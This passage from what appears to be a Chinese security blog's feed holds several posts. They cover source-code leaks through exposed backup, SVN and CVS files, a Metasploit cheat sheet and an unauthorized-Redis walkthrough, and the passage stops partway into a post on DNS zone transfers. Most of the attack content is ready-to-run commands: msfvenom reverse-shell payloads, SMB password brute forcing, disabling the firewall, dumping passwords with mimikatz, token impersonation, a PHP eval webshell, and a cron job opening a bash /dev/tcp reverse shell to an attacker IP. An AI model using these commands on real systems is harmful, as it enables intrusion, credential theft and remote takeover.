<h3 id="网站备份压缩文件"><a href="#网站备份压缩文件" class="headerlink" title="网站备份压缩文件"></a>网站备份压缩文件</h3><p>在网站的使用过程中，往往需要对网站中的文件进行修改、升级。此时就需要对网站整站或者其中某一页面进行备份。当备份文件或者修改过程中的缓存文件因为各种原因而被留在网站web目录下，而该目录又没有设置访问权限时，便有可能导致备份文件或者编辑器的缓存文件被下载，导致敏感信息泄露，给服务器的安全埋下隐患。</p>
<h4 id="漏洞成因及危害"><a href="#漏洞成因及危害" class="headerlink" title="漏洞成因及危害:"></a>漏洞成因及危害:</h4><p>该漏洞的成因主要有以下两种：</p>
<p>服务器管理员错误地将网站或者网页的备份文件放置到服务器web目录下。<br>编辑器在使用过程中自动保存的备份文件或者临时文件因为各种原因没有被删除而保存在web目录下。</p>
<h4 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测:"></a>漏洞检测:</h4><p>该漏洞往往会导致服务器整站源代码或者部分页面的源代码被下载，利用。源代码中所包含的各类敏感信息，如服务器数据库连接信息，服务器配置信息等会因此而泄露，造成巨大的损失。被泄露的源代码还可能会被用于代码审计，进一步利用而对整个系统的安全埋下隐患。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">.rar</div><div class="line">.zip</div><div class="line">.7z</div><div class="line">.tar.gz</div><div class="line">.bak</div><div class="line">.swp</div><div class="line">.txt</div><div class="line">.html</div></pre></td></tr></table></figure></p>
<h3 id="SVN导致文件泄露"><a href="#SVN导致文件泄露" class="headerlink" title="SVN导致文件泄露"></a>SVN导致文件泄露</h3><p>Subversion，简称SVN，是一个开放源代码的版本控制系统，相对于的RCS、CVS，采用了分支管理系统，它的设计目标就是取代CVS。互联网上越来越多的控制服务从CVS转移到Subversion。</p>
<p>Subversion使用服务端—客户端的结构，当然服务端与客户端可以都运行在同一台服务器上。在服务端是存放着所有受控制数据的Subversion仓库，另一端是Subversion的客户端程序，管理着受控数据的一部分在本地的映射（称为“工作副本”）。在这两端之间，是通过各种仓库存取层（Repository Access，简称RA）的多条通道进行访问的。这些通道中，可以通过不同的网络协议，例如HTTP、SSH等，或本地文件的方式来对仓库进行操作。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">e.g.http://vote.lz.taobao.com/admin/scripts/fckeditor.266/editor/.svn/entries</div></pre></td></tr></table></figure>
<h4 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用:"></a>漏洞利用:</h4><p>工具：</p>
<p><a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="external">dvcs-ripper</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">rip-svn.pl -v -u http://www.example.com/.svn/</div></pre></td></tr></table></figure>
<p>Seay-Svn</p>
<h3 id="WEB-INF-web-xml泄露"><a href="#WEB-INF-web-xml泄露" class="headerlink" title="WEB-INF/web.xml泄露"></a>WEB-INF/web.xml泄露</h3><p>WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。</p>
<p>WEB-INF主要包含一下文件或目录：</p>
<ul>
<li>/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</li>
<li>/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中</li>
<li>/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件</li>
<li>/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。</li>
<li>/WEB-INF/database.properties：数据库配置文件<h4 id="漏洞成因：-2"><a href="#漏洞成因：-2" class="headerlink" title="漏洞成因："></a>漏洞成因：</h4></li>
</ul>
<p>通常一些web应用我们会使用多个web服务器搭配使用，解决其中的一个web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等。在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取。</p>
<p>漏洞检测以及利用方法：</p>
<p>通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。<br>一般情况，jsp引擎默认都是禁止访问WEB-INF目录的，Nginx 配合Tomcat做均衡负载或集群等情况时，问题原因其实很简单，Nginx不会去考虑配置其他类型引擎（Nginx不是jsp引擎）导致的安全问题而引入到自身的安全规范中来（这样耦合性太高了），修改Nginx配置文件禁止访问WEB-INF目录就好了： location ~ ^/WEB-INF/* { deny all; } 或者return 404; 或者其他！</p>
<h3 id="CVS泄漏"><a href="#CVS泄漏" class="headerlink" title="CVS泄漏"></a>CVS泄漏</h3><h4 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>测试的目录</p>
<ul>
<li><a href="http://url/CVS/Root" target="_blank" rel="external">http://url/CVS/Root</a> 返回根信息</li>
<li><a href="http://url/CVS/Entries" target="_blank" rel="external">http://url/CVS/Entries</a> 返回所有文件的结构<br>取回源码的命令<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bk clone http://url/name dir</div></pre></td></tr></table></figure>
</li>
</ul>
<p>这个命令的意思就是把远端一个名为name的repo clone到本地名为dir的目录下。</p>
<p>查看所有的改变的命令，转到download的目录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">bk changes</div><div class="line">Bazaar/bzr</div></pre></td></tr></table></figure></p>
<p>工具：</p>
<p><a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="external">dvcs-ripper</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">rip-bzr.pl -v -u http://www.example.com/.bzr/</div></pre></td></tr></table></figure></p>
<p>工具推荐</p>
<p>Bitkeeper<br>weakfilescan</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://zhuanlan.zhihu.com/p/21296806" target="_blank" rel="external">https://zhuanlan.zhihu.com/p/21296806</a><br><a href="http://www.s2.sshz.org/post/source-code-leak/" target="_blank" rel="external">http://www.s2.sshz.org/post/source-code-leak/</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读全文&lt;br&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://uknowsec.cn/categories/ctf/"/>
    
    
  </entry>
  
  <entry>
    <title>Meatsploit Framework 利用总结</title>
    <link href="http://uknowsec.cn/posts/skill/Meatsploit-Framework-%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93.html"/>
    <id>http://uknowsec.cn/posts/skill/Meatsploit-Framework-利用总结.html</id>
    <published>2017-07-13T04:15:40.000Z</published>
    <updated>2017-07-13T06:27:16.975Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h2 id="msfvenom-Payload-List"><a href="#msfvenom-Payload-List" class="headerlink" title="msfvenom Payload List"></a>msfvenom Payload List</h2><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</div></pre></td></tr></table></figure>
<h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</div></pre></td></tr></table></figure>
<h3 id="Mac"><a href="#Mac" class="headerlink" title="Mac"></a>Mac</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho</div></pre></td></tr></table></figure>
<h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php</div><div class="line">cat shell.php | pbcopy &amp;&amp; echo &apos;&lt;?php &apos; | tr -d &apos;\n&apos; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</div></pre></td></tr></table></figure>
<h3 id="ASP"><a href="#ASP" class="headerlink" title="ASP"></a>ASP</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</div></pre></td></tr></table></figure>
<h3 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</div></pre></td></tr></table></figure>
<h3 id="WAR"><a href="#WAR" class="headerlink" title="WAR"></a>WAR</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war</div></pre></td></tr></table></figure>
<h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</div></pre></td></tr></table></figure>
<h3 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</div></pre></td></tr></table></figure>
<h3 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</div></pre></td></tr></table></figure>
<h2 id="Handlers"><a href="#Handlers" class="headerlink" title="Handlers"></a>Handlers</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">use exploit/multi/handler</div><div class="line">set PAYLOAD &lt;Payload name&gt;</div><div class="line">set LHOST &lt;LHOST value&gt;</div><div class="line">set LPORT &lt;LPORT value&gt;</div><div class="line">set ExitOnSession false</div><div class="line">exploit -j -z</div></pre></td></tr></table></figure>
<h2 id="扫描端口"><a href="#扫描端口" class="headerlink" title="扫描端口"></a>扫描端口</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">use auxiliary/scanner/portscan/tcp</div><div class="line">show options</div><div class="line">set LHOST &lt;LHOST value&gt;</div><div class="line">set LPORTS &lt;LPORT value&gt;</div><div class="line">exploit</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/msfvemon2.jpg" alt=""></p>
<h2 id="Windows-Smb模块"><a href="#Windows-Smb模块" class="headerlink" title="Windows Smb模块"></a>Windows Smb模块</h2><h3 id="扫描smb判断主机"><a href="#扫描smb判断主机" class="headerlink" title="扫描smb判断主机"></a>扫描smb判断主机</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">use auxiliary/scanner/smb/smb_version</div><div class="line">show options</div><div class="line">exploit</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/msfvemon3.jpg" alt=""></p>
<h3 id="爆破smb密码"><a href="#爆破smb密码" class="headerlink" title="爆破smb密码"></a>爆破smb密码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">use auxiliary/scanner/smb/smb_login</div><div class="line">set SMBUser administrator</div><div class="line">set PASS_FILE /tmp/pass</div><div class="line">set RHOSTS 192.168.1.116</div><div class="line">exploit</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/msfvemon4.jpg" alt=""></p>
<h3 id="开启3389远程桌面"><a href="#开启3389远程桌面" class="headerlink" title="开启3389远程桌面"></a>开启3389远程桌面</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">meterpreter &gt; run post/windows/manage/enable_rdp</div></pre></td></tr></table></figure>
<h3 id="关闭防火墙"><a href="#关闭防火墙" class="headerlink" title="关闭防火墙"></a>关闭防火墙</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">shell</div><div class="line">netsh adcfirewall set allprofiles state off</div></pre></td></tr></table></figure>
<h3 id="实时截图"><a href="#实时截图" class="headerlink" title="实时截图"></a>实时截图</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">screenshot</div><div class="line">use espia</div></pre></td></tr></table></figure>
<h3 id="meterpreter加载mimikatz抓取明文密码"><a href="#meterpreter加载mimikatz抓取明文密码" class="headerlink" title="meterpreter加载mimikatz抓取明文密码"></a>meterpreter加载mimikatz抓取明文密码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">meterpreter&gt;load mimikatz</div><div class="line">msv</div><div class="line">kerberos</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/msfvemon1.jpg" alt=""></p>
<h3 id="窃取及伪造域账户-token"><a href="#窃取及伪造域账户-token" class="headerlink" title="窃取及伪造域账户 token"></a>窃取及伪造域账户 token</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">load incognito</div><div class="line">list_tokens -u</div><div class="line">impersonate_token xxxxx\\xxxxxxx</div><div class="line">execute -f cmd.exe -i -t</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/msfvemon6.jpg" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读全文&lt;br&gt;
    
    </summary>
    
      <category term="技巧" scheme="http://uknowsec.cn/categories/skill/"/>
    
    
  </entry>
  
  <entry>
    <title>配置漏洞之redis未授权访问</title>
    <link href="http://uknowsec.cn/posts/skill/%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E%E4%B9%8Bredis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE.html"/>
    <id>http://uknowsec.cn/posts/skill/配置漏洞之redis未授权访问.html</id>
    <published>2017-07-12T09:35:01.000Z</published>
    <updated>2017-07-17T07:55:42.821Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h2 id="环境安装"><a href="#环境安装" class="headerlink" title="环境安装"></a>环境安装</h2><h3 id="下载源码"><a href="#下载源码" class="headerlink" title="下载源码"></a>下载源码</h3><p>解压缩后编译源码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ wget http://download.redis.io/releases/redis-2.8.3.tar.gz</div><div class="line">$ tar xzf redis-2.8.3.tar.gz</div><div class="line">$ cd redis-2.8.3</div><div class="line">$ make</div></pre></td></tr></table></figure></p>
<h3 id="编译完成后"><a href="#编译完成后" class="headerlink" title="编译完成后"></a>编译完成后</h3><p>在Src目录下，有四个可执行文件redis-server、redis-benchmark、redis-cli和redis.conf。然后拷贝到一个目录下。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">mkdir /usr/redis</div><div class="line">cp redis-server  /usr/redis</div><div class="line">cp redis-benchmark /usr/redis</div><div class="line">cp redis-cli  /usr/redis</div><div class="line">cp redis.conf  /usr/redis</div><div class="line">cd /usr/redis</div></pre></td></tr></table></figure>
<h3 id="启动redis服务"><a href="#启动redis服务" class="headerlink" title="启动redis服务"></a>启动redis服务</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./redis-server ./redis.conf</div></pre></td></tr></table></figure>
<h3 id="查看redis是否开启"><a href="#查看redis是否开启" class="headerlink" title="查看redis是否开启"></a>查看redis是否开启</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">netstat -ntlp | grep redis</div></pre></td></tr></table></figure>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ul>
<li>保存到www目录，创建webshell</li>
<li>创建SSH authorized_keys文件</li>
<li>写计划任务（/var/spool/cron/&amp;/etc/cron.d/）</li>
<li>slave of 8.8.8.8主从模式利用</li>
<li>写入到/etc/profile.d/用户环境变量</li>
<li>开启AOF持久化纯文本记录appendfilename</li>
</ul>
<h3 id="利用nmap获取redis信息"><a href="#利用nmap获取redis信息" class="headerlink" title="利用nmap获取redis信息"></a>利用nmap获取redis信息</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nmap -A -p6379 --script=redis-info 192.168.132.134</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/redis1.jpg" alt=""></p>
<h3 id="利用redis客户端进行未授权访问"><a href="#利用redis客户端进行未授权访问" class="headerlink" title="利用redis客户端进行未授权访问"></a>利用redis客户端进行未授权访问</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">./redis-cli -h 192.168.132.134</div><div class="line">192.168.132.134:6379&gt; info</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/redis2.jpg" alt=""></p>
<p>当然，如果redis存在访问密码的话，可以使用如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./redis-cli -h 192.168.132.134 –a [password]</div></pre></td></tr></table></figure></p>
<h3 id="利用redis连接写入ssh公钥"><a href="#利用redis连接写入ssh公钥" class="headerlink" title="利用redis连接写入ssh公钥"></a>利用redis连接写入ssh公钥</h3><h4 id="在攻击机上生成ssh公钥和私钥"><a href="#在攻击机上生成ssh公钥和私钥" class="headerlink" title="在攻击机上生成ssh公钥和私钥"></a>在攻击机上生成ssh公钥和私钥</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh-keygen -t rsa</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/redis3.jpg" alt=""></p>
<h4 id="将公钥写入文本"><a href="#将公钥写入文本" class="headerlink" title="将公钥写入文本"></a>将公钥写入文本</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">cd ~/.ssh/</div><div class="line">(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;)&gt; 1.txt</div></pre></td></tr></table></figure>
<h4 id="将1-txt写入redis"><a href="#将1-txt写入redis" class="headerlink" title="将1.txt写入redis"></a>将1.txt写入redis</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cat 1.txt | /usr/local/redis/./redis-cli -h 192.168.132.134 -x set crack</div></pre></td></tr></table></figure>
<h4 id="利用redis客户端连接靶机redis"><a href="#利用redis客户端连接靶机redis" class="headerlink" title="利用redis客户端连接靶机redis"></a>利用redis客户端连接靶机redis</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./redis-cli -h 192.168.132.134</div></pre></td></tr></table></figure>
<h4 id="获取redis备份的路径"><a href="#获取redis备份的路径" class="headerlink" title="获取redis备份的路径"></a>获取redis备份的路径</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">192.168.132.134:6379&gt; CONFIG GET dir</div></pre></td></tr></table></figure>
<h4 id="更改redis备份路径"><a href="#更改redis备份路径" class="headerlink" title="更改redis备份路径"></a>更改redis备份路径</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">192.168.132.134:6379&gt; CONFIG SET dir /root/.ssh</div></pre></td></tr></table></figure>
<h4 id="设置备份文件的名称为authorized-keys"><a href="#设置备份文件的名称为authorized-keys" class="headerlink" title="设置备份文件的名称为authorized_keys"></a>设置备份文件的名称为authorized_keys</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">192.168.132.134:6379&gt; CONFIG SET dbfilename authorized_keys</div></pre></td></tr></table></figure>
<h4 id="检查是否更改"><a href="#检查是否更改" class="headerlink" title="检查是否更改"></a>检查是否更改</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">192.168.132.134:6379&gt; CONFIG GET dbfilename</div></pre></td></tr></table></figure>
<h4 id="保存"><a href="#保存" class="headerlink" title="保存"></a>保存</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">192.168.132.134:6379&gt; save</div></pre></td></tr></table></figure>
<h4 id="ssh连接"><a href="#ssh连接" class="headerlink" title="ssh连接"></a>ssh连接</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh –i  id_rsa root@192.168.1.11</div></pre></td></tr></table></figure>
<h3 id="利用redis写入Shell"><a href="#利用redis写入Shell" class="headerlink" title="利用redis写入Shell"></a>利用redis写入Shell</h3><h4 id="查看是否存在web服务"><a href="#查看是否存在web服务" class="headerlink" title="查看是否存在web服务"></a>查看是否存在web服务</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nmap 192.168.1.111</div></pre></td></tr></table></figure>
<h4 id="确定web服务目录"><a href="#确定web服务目录" class="headerlink" title="确定web服务目录"></a>确定web服务目录</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">config set dir /usr/local/apache/htdocs/</div><div class="line">config set dbfilename ok.php </div><div class="line">set test &quot;&lt;?php @eval($_POST[123]);?&gt;&quot;</div><div class="line">save</div></pre></td></tr></table></figure>
<h4 id="菜刀连接一句话木马"><a href="#菜刀连接一句话木马" class="headerlink" title="菜刀连接一句话木马"></a>菜刀连接一句话木马</h4><p><img src="http://obr4sfdq7.bkt.clouddn.com/redis-cli0.png" alt=""></p>
<h3 id="写计划任务来反弹shell"><a href="#写计划任务来反弹shell" class="headerlink" title="写计划任务来反弹shell"></a>写计划任务来反弹shell</h3><h4 id="telnet登录-也可以redis-cli登录"><a href="#telnet登录-也可以redis-cli登录" class="headerlink" title="telnet登录/也可以redis-cli登录"></a>telnet登录/也可以redis-cli登录</h4><p><img src="http://obr4sfdq7.bkt.clouddn.com/redis-cli1.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">telnet 192.168.236.130 6379 //未授权登录</div><div class="line"></div><div class="line">config set dir /var/spool/cron/ //配置文件夹的路径（CONFIG SET 命令可以动态地调整 Redis 服务器的配置而(configuration)而无须重启。）//每个用户生成的crontab文件，都会放在 /var/spool/cron/ 目录下面</div><div class="line"></div><div class="line">set -.- &quot;\n\n\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.236.129/9999 0&gt;&amp;1\n\n\n&quot; //直接往当前用户的crontab里写入反弹shell，换行是必不可少的。</div></pre></td></tr></table></figure>
<h4 id="nc反弹"><a href="#nc反弹" class="headerlink" title="nc反弹"></a>nc反弹</h4><p><img src="http://obr4sfdq7.bkt.clouddn.com/redis-cli2.png" alt=""></p>
<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ul>
<li>禁止使用 root 权限启动 redis 服务；</li>
<li>对 redis 访问启用密码认证，并且添加 IP 访问限制；</li>
<li>尽可能不对公网直接开放 SSH 服务。</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读全文&lt;br&gt;
    
    </summary>
    
      <category term="技巧" scheme="http://uknowsec.cn/categories/skill/"/>
    
    
  </entry>
  
  <entry>
    <title>配置漏洞之DNS域传送信息泄露</title>
    <link href="http://uknowsec.cn/posts/skill/%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E%E4%B9%8BDNS%E5%9F%9F%E4%BC%A0%E9%80%81%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2.html"/>
    <id>http://uknowsec.cn/posts/skill/配置漏洞之DNS域传送信息泄露.html</id>
    <published>2017-07-12T08:17:07.000Z</published>
    <updated>2017-07-12T08:36:59.080Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Dns是整个互联网公司业务的基础，目前越来越多的互联网公司开始自己搭建DNS服务器做解析服务，同时由于DNS服务是基础性服务非常重要，因此很多公司会对DNS服务器进行主备配置而DNS主备之间的数据同步就会用到dns域传送，但如果配置不当，就会导致任何匿名用户都可以获取DNS服务器某一域的所有记录，将整个企业的基础业务以及网络架构对外暴露从而造成严重的信息泄露，甚至导致企业网络被渗透。</p>
<h2 id="成因"><a href="#成因" class="headerlink" title="成因"></a>成因</h2><p>DNS服务器的主备数据同步，使用的是域传送功能。 域传送关键配置项为：</p>
<p>allow-transfer {ipaddress;}; 通过ip限制可进行域传送的服务器</p>
<p>allow-transfer { key transfer; }; 通过key限制可进行域传送的服务器</p>
<p>options配置如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">options &#123;  </div><div class="line">listen-on &#123; 1.1.1.1; &#125;;  </div><div class="line">listen-on-v6 &#123; any; &#125;;  </div><div class="line">directory &quot;/bind&quot;;  </div><div class="line">pid-file &quot;/bind/run/pid&quot;;  </div><div class="line">dump-file &quot;/bind/data/named_dump.db&quot;;  </div><div class="line">statistics-file &quot;/bind/data/named.stats&quot;;</div><div class="line"></div><div class="line">    allow-transfer  &#123; any; &#125;;</div><div class="line">    allow-query    &#123;any;&#125;;</div><div class="line"></div><div class="line"></div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>zone配置如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">zone &quot;wooyun.org&quot; &#123;  </div><div class="line">type master;  </div><div class="line">file &quot;/bind/etc/wooyun.org.conf&quot;;  </div><div class="line">allow-transfer &#123;any;&#125;;  </div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>笔者测试版本为BIND 9.8.2rc1-RedHat-9.8.2-0.10.rc1.el6_3.6，默认安装完毕后，配置项没有allow-transfer 项。如果直接使用默认配置文件进行配置的话（不手动添加allow-transfer项），就会存在dns 域传送漏洞。</p>
